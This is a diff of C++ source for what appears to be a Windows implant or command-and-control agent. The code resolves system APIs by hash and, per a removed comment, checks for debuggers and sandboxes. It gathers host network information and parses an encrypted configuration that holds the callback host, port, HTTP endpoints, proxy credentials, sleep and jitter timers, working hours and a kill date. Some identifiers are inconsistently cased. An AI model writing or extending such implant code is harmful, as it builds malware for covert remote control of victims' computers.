@@ -1,4 +1,4 @@
-#include <core/include/base.hpp>
+#include <core/monolith.hpp>
 
 VOID Entrypoint() {
 	HEXANE instance = { };
@@ -34,10 +34,7 @@ namespace Main {
 		Ctx->Win32.RtlGetVersion = 	FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLGETVERSION);
 		Ctx->Win32.IsWow64Process = FindExportAddress((LPVOID)Ctx->Module.Kernel32, ISWOW64PROCESS);
 
-		// NOTE: Get version and check for dbg and sandbox
         OSVERSIONINFOW osVersion = { };
-        BOOL success = false;
-
         if (!NT_SUCCESS(Ctx->Win32.RtlGetVersion(&os_version))) {
 			return false;
 		}
@@ -123,7 +120,6 @@ namespace Main {
         MemSet(buffer, 0, MAX_PATH);
         nameLen = MAX_PATH;
 
-		// NOTE: Beyond this point we can start capturing info.
 		Ctx->Module.Iphlpapi = LoadLibrary("iphlpapi.dll");
 		Ctx->Win32.GetAdaptersInfo = FindExportAddress((LPVOID)Ctx->Module.Iphlpapi, GETADAPTERSINFO);
 
@@ -293,21 +289,20 @@ defer:
         MemSet(Config, 0, sizeof(Config));
 
         Ctx->PacketCache  	= nullptr;
-        ctx->session.NodeId	= UnpackUint32(&parser);
+        ctx->session.NodeId	= UnpackUint32(&parser); // NodeId
 
-        ParserMemcpy(&parser, &Ctx->Config.SessionKey, nullptr);
-
-        if (ENCRYPTED) {
-            XteaCrypt(B_PTR(parser.buffer), parser.Length, Ctx->Config.SessionKey, false);
+        ParserMemcpy(&parser, &Ctx->Config.SessionKey, nullptr); // SessionKey
+        if (Ctx->Config.SessionKey) {
+            XteaCrypt(B_PTR(parser.Buffer), parser.Length, Ctx->Config.SessionKey, false);
         }
 
-        ParserStrcpy(&parser, &Ctx->Config.Hostname, nullptr);
+        ParserStrcpy(&parser, &Ctx->Config.Hostname, nullptr); // Hostname
 
-        Ctx->Session.Retries        = UnpackUint32(&parser);
-        Ctx->Config.WorkingHours   	= UnpackUint32(&parser);
-        Ctx->Config.Killdate		= UnpackUint64(&parser);
-        Ctx->Config.Sleeptime       = UnpackUint32(&parser);
-        Ctx->Config.Jitter          = UnpackUint32(&parser);
+        Ctx->Session.Retries        = UnpackUint32(&parser); // Retries
+        Ctx->Config.WorkingHours   	= UnpackUint32(&parser); // WorkingHours
+        Ctx->Config.Killdate		= UnpackUint64(&parser); // Killdate
+        Ctx->Config.Sleeptime       = UnpackUint32(&parser); // Sleeptime
+        Ctx->Config.Jitter          = UnpackUint32(&parser); // Jitter
 
 #ifdef TRANSPORT_HTTP
         Ctx->Transport.Http = (PHTTP) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP));
@@ -316,33 +311,33 @@ defer:
         Ctx->Transport.Http->Endpoints  = nullptr;
         Ctx->Transport.Http->Headers    = nullptr;
 
-        ParserWcscpy(&parser, &Ctx->Transport.Http->Useragent, nullptr);
-        ParserWcscpy(&parser, &Ctx->Transport.Http->Address, nullptr  );
+        ParserWcscpy(&parser, &Ctx->Transport.Http->Useragent, nullptr); // Useragent
+        ParserWcscpy(&parser, &Ctx->Transport.Http->Address, nullptr  ); // Address
 
-        Ctx->Transport.Http->Port = (INT) UnpackUint32(&parser);
-        ParserStrcpy(&parser, &Ctx->Transport.Domain, nullptr);
+        Ctx->Transport.Http->Port = (INT) UnpackUint32(&parser); // Port
+        ParserStrcpy(&parser, &Ctx->Transport.Domain, nullptr); // Domain
 
-        ctx->transport.http->nEndpoints = UnpackUint32(&parser);
-        ctx->transport.http->endpoints  = (WCHAR**) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(WCHAR*) * ((Ctx->Transport.Http->nEndpoints + 1)));
+        ctx->transport.http->nEndpoints = UnpackUint32(&parser); // Endpoints + nEndpoints
+        ctx->transport.http->Endpoints  = (WCHAR**) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(WCHAR*) * ((Ctx->Transport.Http->nEndpoints + 1)));
 
         for (auto i = 0; i < Ctx->Transport.Http->nEndpoints; i++) {
             ParserWcscpy(&parser, &Ctx->Transport.Http->Endpoints[i], nullptr);
         }
 
         Ctx->Transport.Http->Endpoints[Ctx->Transport.Http->nEndpoints] = nullptr;
-        Ctx->Transport.bProxy = UnpackBool(&parser);
+        Ctx->Transport.bProxy = UnpackBool(&parser); // bProxy
 
         if (Ctx->Transport.bProxy) {
             Ctx->transport.Http->Proxy = (PROXY*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(PROXY));
             Ctx->transport.Http->Access = INTERNET_OPEN_TYPE_PROXY;
 
-            ParserWcscpy(&parser, &Ctx->Transport.Http->Proxy->Address, nullptr );
-            ParserWcscpy(&parser, &Ctx->Transport.Http->Proxy->Username, nullptr );
-            ParserWcscpy(&parser, &Ctx->Transport.Http->Proxy->Password, nullptr );
+            ParserWcscpy(&parser, &Ctx->Transport.Http->Proxy->Address, nullptr ); // Proxy->Address
+            ParserWcscpy(&parser, &Ctx->Transport.Http->Proxy->Username, nullptr ); // Proxy->Username
+            ParserWcscpy(&parser, &Ctx->Transport.Http->Proxy->Password, nullptr ); // Proxy->Password
         }
 #endif
 #ifdef TRANSPORT_PIPE
-        ParserWcscpy(&parser, &Ctx->Transport.PipeName, nullptr);
+        ParserWcscpy(&parser, &Ctx->Transport.PipeName, nullptr); // PipeName
 #endif
         DestroyParser(&parser);
     }
